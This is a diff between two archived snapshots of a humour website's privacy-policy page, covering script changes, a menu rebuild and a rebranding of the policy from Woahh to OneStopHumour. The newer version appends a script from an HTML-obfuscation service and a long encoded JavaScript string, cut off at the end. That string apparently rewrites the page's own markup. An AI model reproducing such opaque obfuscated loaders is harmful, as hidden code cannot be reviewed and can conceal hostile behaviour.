@@ -1,37 +1,22 @@
-<!--The following is the downloaded HTML source of the onestophumour.com privacy policy that was archived on 2013-06-23.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20130623231800id_/http%3A//onestophumour.com/privacy_policy.html) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the onestophumour.com privacy policy that was archived on 2013-12-07.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20131207191729id_/http%3A//onestophumour.com/privacy_policy.html) for the most accurate reproduction.-->
 
 <!DOCTYPE html><html><head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<title>Privacy Policy - One stop humour</title>
+<title>Privacy Policy - One Stop Humor: Funny Pictures and Videos!</title>
 <meta name="description" content="One Stop Humour is the number one funny picture website, updated daily to bring you the best funny, meme, rage, animal and fail pics on the internet!">
 <meta name="keywords" content="funny, troll, lol, one,stop,humor, humor, video, grumpy, rage, meme, pictures, awkward, fails, animals">
 <meta name="p:domain_verify" content="6228ca4b298adc078aeff117764bb944">
-<script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script id="facebook-jssdk" src="//connect.facebook.net/en_US/all.js#xfbml=1&amp;appId=183156165142525"></script><script async="" src="//ajax.cloudflare.com/cdn-cgi/nexp/abv=1573736665/cloudflare.min.js"></script><script type="text/javascript">
-//<![CDATA[
-window.__CF=window.__CF||{};window.__CF.AJS={"ga_key":{"ua":"UA-17128893-3","ga_bs":"2"}};
-//]]>
-</script>
-<script type="text/javascript">
-//<![CDATA[
-try{if (!window.CloudFlare) { var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",mirage:{responsive:0,lazy:0},mirage2:0,oracle:"c3/587b7d40a95636caf148dfd8f443c0",paths:{cloudflare:"/cdn-cgi/nexp/abv=2497138833/"},atok:"19eafc439cb7f25edbebe25050c0b7d5",zone:"onestophumour.com",rocket:"0",apps:{"ga_key":{"ua":"UA-17128893-3","ga_bs":"2"}}}];var a=document.createElement("script"),b=document.getElementsByTagName("script")[0];a.async=!0;a.src="//ajax.cloudflare.com/cdn-cgi/nexp/abv=1573736665/cloudflare.min.js";b.parentNode.insertBefore(a,b);}}catch(e){};
-//]]>
-</script>
 <link href="favicon.ico" rel="shortcut icon" type="image/x-icon"> 
 <link href="templates/default/css/style.css" rel="stylesheet" type="text/css">
+<link href="menustyles.css" rel="stylesheet" type="text/css">
 
 <!--[if lt IE 9]>
 <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
 <![endif]-->
-<script src="js/jquery.min.js"></script>
+<script id="twitter-wjs" src="//platform.twitter.com/widgets.js"></script><script type="text/javascript" async="" src="https://apis.google.com/js/plusone.js"></script><script id="facebook-jssdk" src="//connect.facebook.net/en_US/all.js#xfbml=1&amp;appId=183156165142525"></script><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script src="js/jquery.min.js"></script>
 <script type="text/javascript" src="js/jquery.form.js"></script>
-<script src="js/slide.js" type="text/javascript"></script>
-<script src="js/jquery.timeago.js" type="text/javascript"></script>
-<script type="text/javascript">
-jQuery(document).ready(function() {
-  jQuery("abbr.timeago").timeago();
-});
-</script>
+
 
 <script type="text/javascript">
 $(function(){
@@ -41,106 +26,21 @@ $(function(){
 });
 </script>
 
+
+<script src="http://api.htmlobfuscator.com/?getsrc=ok&amp;ref=&amp;url=https%3A%2F%2Fweb.archive.org%2Fweb%2F20131207191729id_%2Fhttp%253A%2F%2Fonestophumour.com%2Fprivacy_policy.html"></script><script async="" src="http://widgets.amung.us/classic.js"></script></head><body><div id="fb-root"></div>
 <script type="text/javascript">
-$(function() {
 
-$(".vote").click(function() 
-{
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-17128893-3']);
+  _gaq.push(['_setDomainName', 'onestophumour.com']);
+  _gaq.push(['_trackPageview']);
 
-var id = $(this).attr("id");
-var name = $(this).attr("name");
-var dataString = {
-			'id' : id,
-			'section' : 0		};
-var parent = $(this);
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
 
-
-	if(name=='up')
-	{
-	
-		$(this).fadeIn(200).html('<img src="images/dot.png" align="absmiddle">');
-			$.ajax({
-			   type: "POST",
-			   url: "up_vote.php",
-			   data: dataString,
-			   cache: false,
-			
-			   success: function(html)
-			   {
-			    parent.html(html);
-			   }  
-			   
-			 });
-		  
-	}
-	else
-	{
-	
-		$(this).fadeIn(200).html('<img src="images/dot.png" align="absmiddle">');
-			$.ajax({
-			   type: "POST",
-			   url: "down_vote.php",
-			   data: dataString,
-			   cache: false,
-			
-			   success: function(html)
-			   {
-			       parent.html(html);
-			   }
-			   
-			});
-		
-	}   
-	 
-return false;
-	});
-
-});
-</script>
-<script>
-	 $(document).ready(function () { 
-   $(window).keydown(function (e) 
-   {
-       if ( e.which === 37 ) 
-       {
-           window.location.href = previous_nav.href;        
-       } 
-       else if ( e.which === 39 ) 
-       {
-           window.location.href = next_nav.href; 
-       }
-       else if ( e.which === 9 ) 
-       {
-           window.location.href = random_key.href; 
-       }
-   });
-  });
-</script>
-
-
-
-<script async="" src="http://widgets.amung.us/small.js"></script></head><body><div id="fb-root"></div>
-<script>(function(d, s, id) {
-  var js, fjs = d.getElementsByTagName(s)[0];
-  if (d.getElementById(id)) return;
-  js = d.createElement(s); js.id = id;
-  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=183156165142525";
-  fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));</script>
-<script type="text/javascript">
-/* <![CDATA[ */
-var _gaq = _gaq || [];
-_gaq.push(['_setAccount', 'UA-17128893-3']);
-_gaq.push(['_trackPageview']);
-
-(function() {
-var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-})();
-
-(function(b){(function(a){"__CF"in b&&"DJS"in b.__CF?b.__CF.DJS.push(a):"addEventListener"in b?b.addEventListener("load",a,!1):b.attachEvent("onload",a)})(function(){"FB"in b&&"Event"in FB&&"subscribe"in FB.Event&&(FB.Event.subscribe("edge.create",function(a){_gaq.push(["_trackSocial","facebook","like",a])}),FB.Event.subscribe("edge.remove",function(a){_gaq.push(["_trackSocial","facebook","unlike",a])}),FB.Event.subscribe("message.send",function(a){_gaq.push(["_trackSocial","facebook","send",a])}));"twttr"in b&&"events"in twttr&&"bind"in twttr.events&&twttr.events.bind("tweet",function(a){if(a){var b;if(a.target&&a.target.nodeName=="IFRAME")a:{if(a=a.target.src){a=a.split("#")[0].match(/[^?=&]+=([^&]*)?/g);b=0;for(var c;c=a[b];++b)if(c.indexOf("url")===0){b=unescape(c.split("=")[1]);break a}}b=void 0}_gaq.push(["_trackSocial","twitter","tweet",b])}})})})(window);
-/* ]]> */
 </script>
 
 
@@ -149,7 +49,7 @@ var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga
 
 <header>
 <div class="head-container">
-<div class="divLogo"><a href="index.html"><img src="images/logo.png" alt="One stop humour" width="287" height="84"></a></div>
+<div class="divLogo"><a href="index.html"><img src="images/logo.png" alt="One Stop Humor: Funny Pictures and Videos!" width="287" height="84"></a></div>
 <div class="headerAds">
 	<script type="text/javascript"><!--
 	google_ad_client = "ca-pub-5578298055006689";
@@ -166,12 +66,7 @@ var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga
 </header>
 <div class="other">
 <div class="mbar">
-<ul id="mainMenu">
-	<li><a href="index.html" title="">Home</a></li>
-	<li><a href="index.html" title="" class="actve">Pictures</a></li>
-	<li><a href="videos.html" title="">Video</a></li>
-	<li><a href="grumpy-cat.html" title="">Grumpy Cat</a></li>
-</ul>
+
 <div class="search-box">
  
 <form method="get" action="search.php" id="search_box">
@@ -183,15 +78,42 @@ var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga
 </form>
 
 </div>
-<ul id="menu">
-	 
-	<li><a href="rated.html" title="">Top Rated</a></li>
-    <li><a href="tops.html" title="">Top Viewed</a></li>
-    <li><a href="new.html" title="">Recently Added</a></li>
-                <li><a id="random_key" href="picture-170-dat-feeling-.html" title="">Randoms</a></li>
-    
+<div id="cssmenu">
+<ul>
+   <li class="active"><a href="index.html"><span>Home</span></a></li>
+   <li class="has-sub"><a href="index.html"><span>Pictures</span></a>
+      <ul>
+      	
+         <li><a href="rated.html"><span>Top Rated</span></a></li>
+         <li><a href="tops.html"><span>Top Viewed</span></a></li>
+         <li class="last"><a href="new.html"><span>Recently Added</span></a></li>
+         
+      </ul>
+   </li>
+   <li class="has-sub"><a href="videos.html"><span>Videos</span></a>
+      <ul>
+      	
+         <li><a href="video-rated.html"><span>Top Rated</span></a></li>
+         <li><a href="video-tops.html"><span>Top Viewed</span></a></li>
+         <li><a href="video-new.html"><span>Recently Added</span></a></li>
+         <li class="last"><a href="http://watchvinevideos.com"><span>Vine Videos</span></a></li>
+         
+      </ul>
+   </li>
+   <li class="has-sub"><a href="grumpy-cat.html"><span>Grumpy Cat</span></a>
+      <ul>
+      	
+         <li><a href="grumpycat-rated.html"><span>Top Rated</span></a></li>
+         <li><a href="grumpycat-tops.html"><span>Top Viewed</span></a></li>
+         <li class="last"><a href="grumpycat-new.html"><span>Recently Added</span></a></li>
+        
+      </ul>
+   </li>
+   <li><a href="http://woahh.com"><span>Store</span></a></li>
+	   		<li class="last"><a id="random_key" href="picture-31-briefly-describe-the-basic-process-of-dna-replication-.html" title=""><span>Random</span></a></li>
+	   
 </ul>
-
+</div>
 <div style="clear:both;"></div>
 </div>
 <div style="clear:both;"></div>
@@ -200,7 +122,7 @@ var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga
 </div><!--end left-box-->
 <div class="p-container">
 <div class="p-title">Privacy Policy</div>
-This Privacy Policy governs the manner in which Woahh collects, uses, maintains and discloses information collected from users (each, a "User") of the <a href="www.woahh.com">www.woahh.com</a> website ("Site"). This privacy policy applies to the Site and all products and services offered by Woahh.<br><br>
+This Privacy Policy governs the manner in which OneStopHumour collects, uses, maintains and discloses information collected from users (each, a "User") of the <a href="www.onestophumour.com">www.onestophumour.com"</a> website ("Site"). This privacy policy applies to the Site and all products and services offered by OnestopHumour.<br><br>
 
 <b>Personal identification information</b><br><br>
 
@@ -216,7 +138,7 @@ Our Site may use "cookies" to enhance User experience. User's web browser places
 
 <b>How we use collected information</b><br><br>
 
-Woahh may collect and use Users personal information for the following purposes:<br>
+OneStopHumour may collect and use Users personal information for the following purposes:<br>
 <ul>
 <li><i>- To improve customer service</i><br>
 	Information you provide helps us respond to your customer service requests and support needs more efficiently.</li>
@@ -245,6 +167,10 @@ Users may find advertising or other content on our Site that link to the sites a
 
 Ads appearing on our site may be delivered to Users by advertising partners, who may set cookies. These cookies allow the ad server to recognize your computer each time they send you an online advertisement to compile non personal identification information about you or others who use your computer. This information allows ad networks to, among other things, deliver targeted advertisements that they believe will be of most interest to you. This privacy policy does not cover the use of cookies by any advertisers.<br><br>
 
+<b>3rd Party Advertising</b><br><br>
+
+We allow third-party companies to serve ads and/or collect certain anonymous information when you visit our web site. These companies may use non-personally identifiable information (e.g., click stream information, browser type, time and date, subject of advertisements clicked or scrolled over) during your visits to this and other Web sites in order to provide advertisements about goods and services likely to be of greater interest to you. These companies typically use a cookie or third party web beacon to collect this information. To learn more about this behavioral advertising practice or to opt-out of this type of advertising, you can visit http://www.networkadvertising.org/managing/opt_out.asp.<br><br>
+
 <b>Google Adsense</b><br><br>
 
 Some of the ads may be served by Google. Google's use of the DART cookie enables it to serve ads to Users based on their visit to our Site and other sites on the Internet. DART uses "non personally identifiable information" and does NOT track personal information about you, such as your name, email address, physical address, etc. You may opt out of the use of the DART cookie by visiting the Google ad and content network privacy policy at <a href="http://www.google.com/privacy_ads.html">http://www.google.com/privacy_ads.html</a><br><br>
@@ -255,42 +181,241 @@ Protecting the privacy of the very young is especially important. For that reaso
 
 <b>Changes to this privacy policy</b><br><br>
 
-Woahh has the discretion to update this privacy policy at any time. When we do, we will post a notification on the main page of our Site. We encourage Users to frequently check this page for any changes to stay informed about how we are helping to protect the personal information we collect. You acknowledge and agree that it is your responsibility to review this privacy policy periodically and become aware of modifications.<br><br>
+OneStopHumour has the discretion to update this privacy policy at any time. When we do, we will post a notification on the main page of our Site. We encourage Users to frequently check this page for any changes to stay informed about how we are helping to protect the personal information we collect. You acknowledge and agree that it is your responsibility to review this privacy policy periodically and become aware of modifications.<br><br>
 
 <b>Your acceptance of these terms</b><br><br>
 
-By using this Site, you signify your acceptance of this policy and <a href="www.woahh.com/terms.html">terms of service</a>. If you do not agree to this policy, please do not use our Site. Your continued use of the Site following the posting of changes to this policy will be deemed your acceptance of those changes.<br><br>
+By using this Site, you signify your acceptance of this policy and <a href="www.onestophumour.com/terms.html">terms of service</a>. If you do not agree to this policy, please do not use our Site. Your continued use of the Site following the posting of changes to this policy will be deemed your acceptance of those changes.<br><br>
 
 <b>Contacting us</b><br><br>
 
 If you have any questions about this Privacy Policy, the practices of this site, or your dealings with this site, please contact us at:<br>
-<a href="www.woahh.com">Woahh</a><br>
-<a href="www.woahh.com">www.woahh.com</a><br>
+<a href="www.onestophumour.com">One Stop Humour</a><br>
+<a href="www.onestophumour.com">www.onestophumour.com</a><br>
 39 North Road
 London<br>
-woahhcom@gmail.com<script type="text/javascript">
-/* <![CDATA[ */
-(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
-/* ]]> */
-</script><br>
+woahhcom@gmail.com<br>
 <br>
-This document was last updated on February 04, 2013<br><br>
-<div class="p-body"><br></div>
+This document was last updated on July 01, 2013<br><br>
+<div class="p-body"><br>_921923</div>
 </div><!--end 2nd container -->
 </div>
+<script language="javascript" type="text/javascript">var _0lO='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